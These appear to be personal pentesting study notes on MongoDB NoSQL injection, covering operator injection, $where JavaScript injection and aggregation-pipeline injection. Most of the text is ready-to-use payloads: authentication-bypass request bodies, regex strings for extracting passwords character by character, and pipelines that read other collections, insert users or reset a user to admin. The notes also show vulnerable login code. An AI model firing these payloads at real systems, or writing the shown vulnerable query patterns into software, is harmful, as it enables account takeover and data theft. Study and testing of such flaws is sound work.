
### Concepts

NoSQL injection occurs when an attacker manipulates queries by injecting malicious input into a NoSQL database query. Unlike SQL injection, NoSQL injection often exploits JSON-based queries and operators like `$ne`, `$gt`, `$regex`, or `$where` in MongoDB.
### Impact
1. Authentication bypass
2. Arbitrary javascript execution on the mongodb server.
3. - Bypass authentication or protection mechanisms.
- Extract or edit data. this is highly restricted to the collection in the query 

When a MongoDB NoSQL injection occurs, the data the user can access depends on where the vulnerability is and which collection is being used. For those familiar with traditional SQL databases, think of “`collections`” in MongoDB as “`tables`“, and “`documents`” as “`rows`“. If the injection happens in the “`find`” method, data access is limited to the defined collection, which may not contain any sensitive data. This is why some clients might not consider a MongoDB NoSQL injection attack valuable.

- Cause a denial of service.
- Execute code on the server.

### Operator Injection

| Operator | Description        |
| -------- | ------------------ |
| $ne      | not equal          |
| $regex   | regular expression |
| $gt      | greater than       |
| $lt      | lower than         |
| $nin     | not in             |

the type of special characters that work: `/ { } :`.

-------------------------
### Testing Methodology


In **SQLi**, you inject objects/mongoDB operators into a query string. example:
lets say a search parameter is taking in a fruit name as a search query and you are searching for apple, the following API request will be created, your input will be inside qoutes:
```
username: "admin",
password: "24552wfrfw2wt#W#ajr@!_:a"
```
now when you inject the query string turns into an object:
```
username: "admin",
password: "{"$ne": null}"
```

Bad code usually looks like:

```js
db.users.findOne({
  username: req.body.username,
  password: req.body.password
})
```
when mongodb destructures your object and reads the operator `$ne` aka not equal to: null, you've an absolute condition that's always evals to true. you always assume a user has set a password so the query passes
good code should add validations towards the password, but that would also result in JS injection

---
##  The 2 big NoSQL injection you must remember

### A) **Operator injection

Inject MongoDB operators like:

```
$ne, $gt, $regex, $where
```

### B) **JavaScript injection** (`$where`, mapReduce, eval)

Less common but **very powerful**.

---

## 3️⃣ Step-by-step pentest workflow (how you’d test this IRL)

### 🔹 Step 1: Confirm it’s Mongo / NoSQL

Try sending **objects instead of strings**:

```json
{
  "username": {"test": "test"},
  "password": "x"
}
```

If the app:

- Errors ❌ → promising
    
- Behaves differently ⚠️ → very promising
    
- Logs you in 😈 → jackpot
    

---

### 🔹 Step 2: Authentication bypass (classic)

#### `$ne` (not equal)

```json
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
```

Why it works:

- Finds **any user where username != null AND password != null**
    

---

#### `$gt` trick (bypasses strict comparisons)

```json
{
  "username": {"$gt": ""},
  "password": {"$gt": ""}
}
```

---

### 🔹 Step 3: Regex-based user discovery

If you want **enumeration** instead of instant bypass:

```json
{
  "username": {"$regex": "^admin"},
  "password": {"$ne": null}
}
```

Or character-by-character brute force:

```json
{
  "username": "admin",
  "password": {"$regex": "^a"}
}
```

Repeat with `^b`, `^c`, etc.


---

MongoDB can evaluate **JavaScript** in `$where`.

### Example vulnerable query:

```js
db.users.findOne({
  $where: "this.username == '" + req.body.username + "' && this.password == '" + req.body.password + "'"
})
```

Now try payloads that **break JS syntax**:

#### Trigger errors / behavior change:

```json
{
  "username": "admin' || '1'=='1",
  "password": "x"
}
```

Which becomes:

```js
this.username == 'admin' || '1'=='1' && this.password == 'x'
```

Boom 💥 logic injection.

---

 Full bypass with `$where`

```json
{
  "username": "admin' || true || '",
  "password": "x"
}
```

---

##  Characters that commonly cause Mongo / JS errors

These are **probing characters** you were thinking of:

|Character|Why useful|
|---|---|
|`'`|Break JS strings|
|`"`|Same|
|`{` `}`|Object injection|
|`$`|Mongo operators|
|`(` `)`|JS execution|
|`;`|JS statement split|
|`//`|Comment out rest|
|`||

If `'` causes a **500 error**, you’re likely in `$where` land.

---

## How frameworks mess this up (realistic mistakes)

### Express + body-parser mistake

```js
app.post("/login", (req, res) => {
  User.findOne(req.body).then(...)
})
```

 This accepts:

```json
{ "$where": "this.password.length > 0" }
```


## examples

Example: A web application has a product search feature

```js
db.products.find({ "price": userInput })
```

An attacker can inject a NoSQL query: `{ "$gt": 0 }`.

```js
db.products.find({ "price": { "$gt": 0 } })
```

Instead of returning a specific product, the database returns all products with a price greater than zero, leaking data.

### Authentication Bypass


Basic authentication bypass using not equal (`$ne`) or greater (`$gt`)

FORMDATA, GET, POST
    
   ```powershell
    username[$ne]=toto&password[$ne]=toto
    login[$regex]=a.*&pass[$ne]=lol
    login[$gt]=admin&login[$lt]=test&pass[$ne]=1
    login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
    ```
    
- JSON data
    
    ```json
    {"username": {"$ne": null}, "password": {"$ne": null}}
    {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
    {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
    {"username": {"$gt":""}, "password": {"$gt":""}}
    ```

---
### Extract Length Information

Inject a payload using the $regex operator. The injection will work when the length is correct.

```powershell
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```
### Extract Data Information


Extract data with "`$regex`" query operator.

- HTTP data/forms
    
    ```powershell
    username[$ne]=toto&password[$regex]=m.{2}
    username[$ne]=toto&password[$regex]=md.{1}
    username[$ne]=toto&password[$regex]=mdp
    
    username[$ne]=toto&password[$regex]=m.*
    username[$ne]=toto&password[$regex]=md.*
    ```
    
- JSON request bodies
    
    ```json
    {"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
    {"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
    {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
    ```
---
## Injection in Aggregation Pipelines


injection in aggregation pipelines increases the impact to the following:

- Reading data from other collections
- Adding data
- Updating data
#### Locations & how to detect even in blackbox scenarios
In MongoDB, the aggregate method always expects an array of aggregation stages as its first argument. Therefore, look for JSON arrays as a parameter. The “`$match`” and “`$lookup`” operators in a JSON request can also indicate the use of the aggregate method.

### A-reading data from other collections:
```
[
  {
    "$lookup": {
      "from": "users",
      "localField": "Dummy-IdontExist",
      "foreignField": "Dummy-IdontExist",
      "as": "user_docs"
    }
  },
  {
    "$limit": 1
  }
]
```

### B-Adding/Inserting Data
```
[
  {
    "$limit": 1
  },
  {
    "$replaceWith": {
      "username": "newUser",
      "first_name": "New",
      "last_name": "User",
      "email": "[email protected]",
      "role": "user",
      "password": "password123",
      "locked": false,
      "resetPasswordToken": ""
    }
  },
  {
    "$merge": {
      "into": "users",
      "whenMatched": "merge",
      "whenNotMatched": "insert"
    }
  }
]
```

### C-Updating-Data
```
[
  {
    "$limit": 1
  },
  {
    "$replaceWith": {
      "_id": { "$toObjectId": "66773d7c85bf15c9d920fe97" },
      "role":"admin",
      "password": "NewPassword123?",
      "locked": false,
      "resetPasswordToken": "1234567890"
    }
  },
  {
    "$merge": {
      "into": "users",
      "whenMatched": "merge",
      "whenNotMatched": "fail"
    }
  }
]
```
## stages to know about:

#### `aggregiation expressions:`
Expressions are MQL components that resolve to a value. Expressions are stateless, meaning they return a value without mutating any of the values used to build the expression. 
```
{ $expr: { <expression> } }
```

### `$addfields`:
The [`$addFields`](https://www.mongodb.com/docs/manual/reference/operator/aggregation/addFields/#mongodb-pipeline-pipe.-addFields) stage is equivalent to a [`$project`](https://www.mongodb.com/docs/manual/reference/operator/aggregation/project/#mongodb-pipeline-pipe.-project) stage that explicitly specifies all existing fields in the input documents and adds the new fields. - Some aggregation pipeline stages, such as [`$project`](https://www.mongodb.com/docs/manual/reference/operator/aggregation/project/#mongodb-pipeline-pipe.-project), [`$addFields`](https://www.mongodb.com/docs/manual/reference/operator/aggregation/addFields/#mongodb-pipeline-pipe.-addFields), and [`$group`](https://www.mongodb.com/docs/manual/reference/operator/aggregation/group/#mongodb-pipeline-pipe.-group)  use [`$expr`](https://www.mongodb.com/docs/manual/reference/operator/query/expr/#mongodb-query-op.-expr) 


example:
plants collection returns
```
name: apple
species: fruit
```
we can add fields using this syntax: 
```
{ $addFields: { <newField>: <expression>, ... } }
```
with $addfield: 'texture: soft'

## Note

You can also use the [`$set`](https://www.mongodb.com/docs/manual/reference/operator/aggregation/set/#mongodb-pipeline-pipe.-set) stage, which is an alias for [`$addFields`.](https://www.mongodb.com/docs/manual/reference/operator/aggregation/addFields/#mongodb-pipeline-pipe.-addFields)

-------------
## Executing Arbitrary javascript on mongoDB 
You can disable all server-side execution of JavaScript:

- For a [`mongod`](https://www.mongodb.com/docs/manual/reference/program/mongod/#mongodb-binary-bin.mongod) instance by passing the [`--noscripting`](https://www.mongodb.com/docs/manual/reference/program/mongod/#std-option-mongod.--noscripting) option on the command line or setting [`security.javascriptEnabled`](https://www.mongodb.com/docs/manual/reference/configuration-options/#mongodb-setting-security.javascriptEnabled) to false in the configuration file.
    
- For a [`mongos`](https://www.mongodb.com/docs/manual/reference/program/mongos/#mongodb-binary-bin.mongos) instance by passing the [`--noscripting`](https://www.mongodb.com/docs/manual/reference/program/mongos/#std-option-mongos.--noscripting) option on the command line or setting [`security.javascriptEnabled`](https://www.mongodb.com/docs/manual/reference/configuration-options/#mongodb-setting-security.javascriptEnabled) to false in the configuration file.
    

The following MongoDB operations permit you to run arbitrary JavaScript expressions directly on the server:

- [`$where`](https://www.mongodb.com/docs/manual/reference/operator/query/where/#mongodb-query-op.-where)
    
- [`mapReduce`](https://www.mongodb.com/docs/manual/reference/command/mapReduce/#mongodb-dbcommand-dbcmd.mapReduce)
    
- [`$accumulator`](https://www.mongodb.com/docs/manual/reference/operator/aggregation/accumulator/#mongodb-group-grp.-accumulator)
    
- [`$function`](https://www.mongodb.com/docs/manual/reference/operator/aggregation/function/#mongodb-expression-exp.-function)
    

## Resources
https://arxiv.org/pdf/1506.04082

